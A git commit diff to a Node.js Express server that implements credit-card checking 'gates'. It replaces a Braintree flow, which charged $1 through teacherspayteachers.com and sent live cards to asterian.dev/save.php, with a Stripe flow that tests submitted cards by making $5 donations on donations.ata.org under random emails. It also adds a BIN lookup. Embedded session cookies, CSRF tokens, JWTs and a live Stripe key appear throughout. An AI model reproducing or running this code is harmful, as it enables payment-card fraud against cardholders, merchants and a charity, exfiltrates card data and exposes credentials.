60b48452c06fac64e0c3b423659f03e2c711c876
quentingonus <55360738+quentingonus@users.noreply.github.com>
2021-09-27 06:49:22 +0630

    added new gate

--- index.js
+++ index.js
@@ -6,6 +6,9 @@ const bodyParser = require('body-parser');
 const cors = require('cors');
 const axios = require("axios");
 const fs = require('fs');
+var qs = require('qs');
+const jsdom = require("jsdom");
+const { JSDOM } = jsdom
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -79,42 +82,34 @@ function adyen(list) {
     });
 }
 
-async function btfirst(cc) {
-  const ccNum = cc.split("|")[0];
-  const ccMonth = cc.split("|")[1];
-  const ccYear = cc.split("|")[2];
-  const ccCvc = cc.split("|")[3];
-  var data = JSON.stringify({
-    "clientSdkMetadata": {
-      "integration": "dropin2",
-      "sessionId": "bb8b4919-0104-44e5-9e50-b8999442bbe9",
-      "source": "client"
-    },
-    "operationName": "TokenizeCreditCard",
-    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
-    "variables": {
-      "input": {
-        "creditCard": {
-          "cvv": ccCvc,
-          "expirationMonth": ccMonth,
-          "expirationYear": ccYear,
-          "number": ccNum
-        },
-        "options": {
-          "validate": false
-        }
-      }
-    }
+async function stripefirst(email, card) {
+  let data = qs.stringify({
+    'email': email,
+    'validation_type': 'card',
+    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
+    'referrer': 'https://donations.ata.org/cart?mode=donate',
+    'pasted_fields': 'number',
+    'card[number]': card[0],
+    'card[cvc]': card[3],
+    'card[exp_month]': card[1],
+    'card[exp_year]': card[2],
+    'card[name]': 'Quentin Gonus',
+    'card[address_line1]': '36 Regent St',
+    'card[address_city]': 'Jamestown',
+    'card[address_state]': 'NY',
+    'card[address_zip]': '14701',
+    'card[address_country]': 'United States',
+    'guid': 'NA',
+    'muid': 'NA',
+    'sid': 'NA',
+    'key': 'pk_live_51BrpDNK13B4nq5Pzvn4PSNdZMfjK2pPnGCmtGyvwbgXRRnFL4adX9BoPid2sh5zJFkFqZ5qcC8OD6cPpKtmcKjVM00d5VLKbMR'
   });
 
-  var config = {
+  let config = {
     method: 'post',
-    url: 'https://payments.braintree-api.com/graphql',
+    url: 'https://api.stripe.com/v1/tokens',
     headers: {
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
-      'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MzE2NDA2MTIsImp0aSI6IjAzNzQwYmM0LTgwMTgtNDQ3Ny1iMmYyLTQ1NDA1NjVhNmE0MiIsInN1YiI6IjdjbTRjZDI4cm1tczY1NXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdjbTRjZDI4cm1tczY1NXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJjdXN0b21lcl9pZCI6IjE5OTU1MzMzNjIifX0.F6trmdD2liCKCzUq4fXUYgCpPrJ8GZUPXNXoHuJmcfo7JTmlEX72bXV5ph4QWfjIQ2R8YqLvtb6ObDXpzApr2g?customer_id=',
-      'Braintree-Version': '2018-05-10',
-      'Content-Type': 'application/json'
+      'Content-Type': 'application/x-www-form-urlencoded'
     },
     data: data
   };
@@ -124,105 +119,66 @@ async function btfirst(cc) {
     .catch(e => { return e.response.data; })
 
 }
-async function btsecond(token) {
-  var data = JSON.stringify({
-    "extensions": {},
-    "operationName": "CartCheckout",
-    "query": "mutation CartCheckout($nonce: String, $firstName: String, $lastName: String, $address: String, $address2: String, $city: String, $state: String, $country: String, $countryId: ID, $postalCode: String, $saveAddress: Boolean, $salesTaxEstimate: String) {\n  member {\n    cartCheckout(input: {paymentMethodNonce: $nonce, billingData: {address: {firstName: $firstName, lastName: $lastName, address: $address, address2: $address2, city: $city, state: $state, country: $country, countryId: $countryId, postalCode: $postalCode}, saveAddressToAccount: $saveAddress}, taxData: {estimateClientReported: $salesTaxEstimate}}) {\n      order {\n        ...CheckoutOrderFields\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment CheckoutOrderFields on Order {\n  id\n  totalAmount\n  taxAmount\n  fee\n  orderItems {\n    itemId\n    totalAmount\n    subtotalAmount\n    price\n    quantity\n    licenseCount\n    product {\n      id\n      name\n      subjects {\n        name\n        __typename\n      }\n      author {\n        id\n        __typename\n      }\n      resourceProperties {\n        isAvailableForDigital\n        isSellerPublishedDigital\n        __typename\n      }\n      itemType\n      types {\n        name\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n",
-    "variables": {
-      "address": "36 Regent St",
-      "address2": "",
+
+
+async function stripesecond(token, email) {
+  let data = JSON.stringify({
+    "quantity": "1",
+    "firstName": "Quentin",
+    "lastName": "Gonus",
+    "email": email,
+    "amount": 5,
+    "location": {
+      "streetLine1": "36 Regent St",
+      "streetLine2": null,
       "city": "Jamestown",
-      "country": "United States",
-      "countryId": 223,
-      "firstName": "Quentin",
-      "lastName": "Gonus",
-      "nonce": token,
-      "postalCode": "14701",
-      "salesTaxEstimate": 0,
-      "saveAddress": true,
-      "state": "NY"
-    }
+      "postCode": "14701",
+      "province": "NY",
+      "country": "United States"
+    },
+    "addToMail": true,
+    "salesforce": {
+      "contactId": "",
+      "campaignId": null,
+      "gauId": ""
+    },
+    "tribute": {
+      "enabled": false,
+      "tributeType": "",
+      "tributeName": "",
+      "tributeAddress": ""
+    },
+    "giftFurther": false,
+    "checkoutType": "stripe",
+    "monthlyPayment": false,
+    "carts": [
+      {
+        "amount": 5,
+        "item": "donation",
+        "total": 5,
+        "additionalRaise": 0,
+        "transactionType": "One-Time"
+      }
+    ],
+    "isUpdate": false,
+    "stripe": token,
+    "utm": {}
   });
 
-  var config = {
+  let config = {
     method: 'post',
-    url: 'https://www.teacherspayteachers.com/graph/graphql?opname=CartCheckout',
+    url: 'https://donations.ata.org/api/v1/orders',
     headers: {
-      'x-csrf-token': ' MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0',
-      'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
-      'x-requested-with': ' XMLHttpRequest',
-      'Origin': ' https://www.teacherspayteachers.com',
-      'Sec-Fetch-Site': ' same-origin',
-      'Sec-Fetch-Mode': ' cors',
-      'Sec-Fetch-Dest': ' empty',
-      'Referer': ' https://www.teacherspayteachers.com/Cart/Checkout',
-      'Cookie': ' ajs_anonymous_id=9af3af2c-5674-4939-8a37-cf22e9278eee; device=desktop; originalDevice=desktop; csrfToken=MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0; optimizelyEndUserId=oeu1631554127367r0.40160949955716596; _gcl_au=1.1.42392555.1631554130; _gid=GA1.2.1374029864.1631554130; _ga=GA1.2.767016092.1631554130; _hp2_ses_props.3064244106=%7B%22ts%22%3A1631554129672%2C%22d%22%3A%22www.teacherspayteachers.com%22%2C%22h%22%3A%22%2F%22%7D; _hjid=2554ed8a-0460-4a85-9647-a43949b89aca; _hjFirstSeen=1; _hjIncludedInSessionSample=1; __ssid=dffe0654500a35b33d408492acdc4f7; TPT-AB-HASH=8daebe76db23541f78a1e3cea1f86dca; _pin_unauth=dWlkPU5XUmhObVF6Wm1ZdE9XVm1NQzAwWVdNeExXSmxaRFV0Wm1ZMll6RmtaVGRqWWpaag; _derived_epik=dj0yJnU9djlqUzBFNmJIR01hekd1VnpsY21MMjFNcUQ1eWRlVEMmbj1DdERSS2N3LWhLM0JwbG9LMy1DRjVnJm09MSZ0PUFBQUFBR0VfaW5ZJnJtPTEmcnQ9QUFBQUFHRV9pblk; TPT=uaelb84eaffpuidlhh2cfnrgb3; TPTC=uaelb84eaffpuidlhh2cfnrgb3; TPTU=19529932692f5a5cbe35ea80b6174c8acfff70; darklyUser=19529932%3A2; darklyNewLogin=1; custom_check_version=1; custom_check_c=g55BC989gKf9%2FT%2Fvsd2sDg%3D%3D; GAPI=eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NfZXhwIjoxNjMxNjQwNjExLCJhdXRoX3RpbWUiOjE2MzE1NTQyMTEsImVtYWlsIjoicXVlbnRpbmdvbnVzQGdtYWlsLmNvbSIsImV4cCI6MTYzMTY0MDYxMSwiZ3JvdXAiOjIsImlhdCI6MTYzMTU1NDIxMSwiaXNfYWRtaW4iOmZhbHNlLCJpc3MiOiJodHRwczovL3d3dy50ZWFjaGVyc3BheXRlYWNoZXJzLmNvbSIsImp0aSI6IjNhYWYwMDRhLTNkMTUtNDY5Ny04NmIxLTEzNWRhYWEwMDRiYyIsInN1YiI6InVzZXI6MTk1Mjk5MzIiLCJ0eXAiOiJhY2Nlc3MiLCJ1c2VybmFtZSI6InF1ZW50aW4xNjMxNTU0MjEwOTE2IiwidmVyc2lvbiI6Mn0.AQdUlOCPcNJQul5WIltjBMak9fppmBy8O7pNP2AqhBK9Ea2CGLFrs-CZauYVkiyylf9SrodTTiN9q-qDdaZSf_XBAD7n6O15eXrcFXqrt1Tx90GUP1o5Vz_BueM33HeCPaRj1Sk5G0wKNn4WXR4gIHp87yTjE21yQmfBNJlyKCOeh1oM; _hp2_props.3064244106=%7B%22tAnonId%22%3A%229af3af2c-5674-4939-8a37-cf22e9278eee%22%2C%22isLoggedIn%22%3Atrue%7D; _uetsid=0f3253c014b811eca3da7f4b7ec60855; _uetvid=0f32774014b811ecae61dfc0599df17d; _hp2_id.3064244106=%7B%22userId%22%3A%223918382863261957%22%2C%22pageviewId%22%3A%222225023137021723%22%2C%22sessionId%22%3A%226766864760436004%22%2C%22identity%22%3A%2219529932%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; classfundSummary={%22active%22:true%2C%22isDraft%22:false%2C%22status%22:%22none%22%2C%22totalContributions%22:%22$0.00%22}; _hjAbsoluteSessionInProgress=1; _gat_UA-3293744-4=1; _tpt_api_key=',
+      'Referer': 'https://donations.ata.org/cart?mode=donate',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
       'Content-Type': 'application/json'
     },
     data: data
   };
+
   return await axios(config)
     .then(({ data }) => { return data })
-    .catch(e => { return e.response.data; })
-
-}
-function reAddItem() {
-  var data = JSON.stringify({
-    "extensions": {},
-    "operationName": "AddToCart",
-    "query": "mutation AddToCart($licenseType: LicenseType!, $productId: ID!, $quantity: Int = 1, $searchToken: String, $recommendationsToken: String) {\n  cart {\n    addProduct(input: {licenseType: $licenseType, productId: $productId, quantity: $quantity, searchToken: $searchToken, recommendationsToken: $recommendationsToken}) {\n      licenseType\n      productId\n      quantity\n      product {\n        id\n        name\n        buyerData {\n          isAddedToCart\n          __typename\n        }\n        author {\n          id\n          sellerPixelId\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
-    "variables": {
-      "licenseType": "NON_TRANSFERABLE_LICENSE",
-      "productId": "7094342",
-      "quantity": 1,
-      "recommendationsToken": "ChMxNzgwOTAyODcwOTk2NjY3MjU0EA0aI2hvbWUtcGFnZS1fcmVjb21tZW5kZV8xNTk0NTYzMTE5NTU4Ihdob21lLXBhZ2UtcnltbC11c2VyLXJlYygA"
-    }
-  });
-
-  var config = {
-    method: 'post',
-    url: 'https://www.teacherspayteachers.com/graph/graphql?opname=AddToCart',
-    headers: {
-      'Host': ' www.teacherspayteachers.com',
-      'x-csrf-token': ' MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0',
-      'sec-ch-ua-mobile': ' ?0',
-      'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
-      'x-requested-with': ' XMLHttpRequest',
-      'Origin': ' https://www.teacherspayteachers.com',
-      'Sec-Fetch-Site': ' same-origin',
-      'Sec-Fetch-Mode': ' cors',
-      'Sec-Fetch-Dest': ' empty',
-      'Referer': ' https://www.teacherspayteachers.com/Product/Types-of-Business-Ownership-Types-of-Business-Ownership-Word-Search-7094342?ref=hp-ryml&rt=ChMxNzgwOTAyODcwOTk2NjY3MjU0EA0aI2hvbWUtcGFnZS1fcmVjb21tZW5kZV8xNTk0NTYzMTE5NTU4Ihdob21lLXBhZ2UtcnltbC11c2VyLXJlYygA',
-      'Cookie': ' ajs_anonymous_id=9af3af2c-5674-4939-8a37-cf22e9278eee; device=desktop; originalDevice=desktop; csrfToken=MDvuBtXT-2Qi0bjPNdrg3_aHPkjchGLUcSV0; optimizelyEndUserId=oeu1631554127367r0.40160949955716596; _gcl_au=1.1.42392555.1631554130; _gid=GA1.2.1374029864.1631554130; _ga=GA1.2.767016092.1631554130; _hjid=2554ed8a-0460-4a85-9647-a43949b89aca; __ssid=dffe0654500a35b33d408492acdc4f7; TPT-AB-HASH=8daebe76db23541f78a1e3cea1f86dca; _pin_unauth=dWlkPU5XUmhObVF6Wm1ZdE9XVm1NQzAwWVdNeExXSmxaRFV0Wm1ZMll6RmtaVGRqWWpaag; TPT=uaelb84eaffpuidlhh2cfnrgb3; TPTC=uaelb84eaffpuidlhh2cfnrgb3; TPTU=19529932692f5a5cbe35ea80b6174c8acfff70; darklyUser=19529932%3A2; darklyNewLogin=1; custom_check_version=1; custom_check_c=g55BC989gKf9%2FT%2Fvsd2sDg%3D%3D; GAPI=eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NfZXhwIjoxNjMxNjQwNjExLCJhdXRoX3RpbWUiOjE2MzE1NTQyMTEsImVtYWlsIjoicXVlbnRpbmdvbnVzQGdtYWlsLmNvbSIsImV4cCI6MTYzMTY0MDYxMSwiZ3JvdXAiOjIsImlhdCI6MTYzMTU1NDIxMSwiaXNfYWRtaW4iOmZhbHNlLCJpc3MiOiJodHRwczovL3d3dy50ZWFjaGVyc3BheXRlYWNoZXJzLmNvbSIsImp0aSI6IjNhYWYwMDRhLTNkMTUtNDY5Ny04NmIxLTEzNWRhYWEwMDRiYyIsInN1YiI6InVzZXI6MTk1Mjk5MzIiLCJ0eXAiOiJhY2Nlc3MiLCJ1c2VybmFtZSI6InF1ZW50aW4xNjMxNTU0MjEwOTE2IiwidmVyc2lvbiI6Mn0.AQdUlOCPcNJQul5WIltjBMak9fppmBy8O7pNP2AqhBK9Ea2CGLFrs-CZauYVkiyylf9SrodTTiN9q-qDdaZSf_XBAD7n6O15eXrcFXqrt1Tx90GUP1o5Vz_BueM33HeCPaRj1Sk5G0wKNn4WXR4gIHp87yTjE21yQmfBNJlyKCOeh1oM; _hp2_props.3064244106=%7B%22tAnonId%22%3A%229af3af2c-5674-4939-8a37-cf22e9278eee%22%2C%22isLoggedIn%22%3Atrue%7D; classfundSummary={%22active%22:true%2C%22isDraft%22:false%2C%22status%22:%22none%22%2C%22totalContributions%22:%22$0.00%22}; _hp2_ses_props.3064244106=%7B%22ts%22%3A1631559589944%2C%22d%22%3A%22www.teacherspayteachers.com%22%2C%22h%22%3A%22%2F%22%7D; _hjIncludedInSessionSample=1; _hjAbsoluteSessionInProgress=0; Ti=a7a1f4d1-0b06-46b1-be00-39036c8284a6; _derived_epik=dj0yJnU9TG5rMXVwb0FOSVZWaHBGS0ZncDhfemtTNktoS3QyTWcmbj1MU0ZXZElqWmtlSV92bnNCQTRrS2hRJm09MSZ0PUFBQUFBR0Vfb2NrJnJtPTEmcnQ9QUFBQUFHRV9vY2s; _hjCachedUserAttributes=eyJhdHRyaWJ1dGVzIjp7fSwidXNlcklkIjoiMTk1Mjk5MzIifQ==; _hp2_id.3064244106=%7B%22userId%22%3A%223918382863261957%22%2C%22pageviewId%22%3A%226071143792166488%22%2C%22sessionId%22%3A%226260873301099747%22%2C%22identity%22%3A%2219529932%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; _dc_gtm_UA-3293744-4=1; _uetsid=0f3253c014b811eca3da7f4b7ec60855; _uetvid=0f32774014b811ecae61dfc0599df17d; _tpt_api_key=',
-      'Content-Type': 'application/json'
-    },
-    data: data
-  };
-  axios(config)
-    .then(({ data }) => { console.log("Added Data") })
-    .catch(e => { console.log("Error. Cannot add to cart!") })
-
-}
-
-function saveCard(cc) {
-  var data = JSON.stringify({
-    "cvv": "CVV LIVE " + cc + " > Charged: 1 $ BrainTree"
-  });
-
-  var config = {
-    method: 'post',
-    url: 'asterian.dev/save.php',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    data: data
-  };
-
-  axios(config)
-    .catch(err => {
-      console.log(err);
-    });
+    .catch(e => { return e.response.data })
 
 }
 
@@ -235,7 +191,9 @@ app.post('/cc', async (req, res) => {
   res.send(result);
 });
 
-app.post('/bt', async (req, res) => {
+
+
+app.post('/stripe', async (req, res) => {
   if (!req.body['cc']) {
     res.send({ error: true, message: "No CC Input" });
     return 0;
@@ -244,24 +202,57 @@ app.post('/bt', async (req, res) => {
     res.send({ error: true, message: "Invalid CC Format" });
     return 0;
   }
-  let result = await btfirst(req.body['cc']);
-  result = await btsecond(result.data.tokenizeCreditCard.token);
-  if (result['errors']) {
-    res.send({
-      cc: req.body['cc'],
-      error: true,
-      message: "Your card has been declined."
-    })
-  } else {
-    reAddItem();
-    saveCard(req.body['cc']);
-    res.send({
-      cc: req.body['cc'],
-      error: false,
-      message: "Charged : 1$"
-    })
-  }
+
+  let email = `quentin${Math.floor((Math.random() * 100000000) + 1)}@asterian.dev`;
+  let cc = req.body['cc'].split("|");
+
+  let result1 = await stripefirst(email, cc);
+  let result2 = await stripesecond(result1, email);
+  // let result2 = await stripesecond();
+  res.send(result2);
 });
+
+
+
+app.get('/api/:bin', (req, res) => {
+  const bin = req.params.bin
+  const api = `https://bins.ws/search?bins=${bin}`;
+  try {
+    fetch(api)
+      .then(response => response.text())
+      .then(data => {
+        data = new JSDOM(data);
+        binData = data.window.document.querySelector(".page tbody tr").textContent
+        let binInfo = binData.split("\n")
+        binInfo = binInfo.filter(i => i)
+        let binObject = {
+          bin: binInfo[0],
+          type: binInfo[1],
+          level: binInfo[2],
+          brand: binInfo[3],
+          bank: binInfo[4],
+          country: binInfo[5]
+        }
+        res.send(binObject)
+      })
+      .catch(error => {
+        console.error('Error:', error)
+        let object = {
+          result: false,
+          message: "Invalid BIN"
+        }
+        res.status(200).send(object)
+      })
+  }
+
+  catch (error) {
+    let object = {
+      result: false,
+      message: error.message
+    }
+    res.send(object)
+  }
+})
 
 app.listen(port, () => {
   console.log(`Server started on ${port}`);
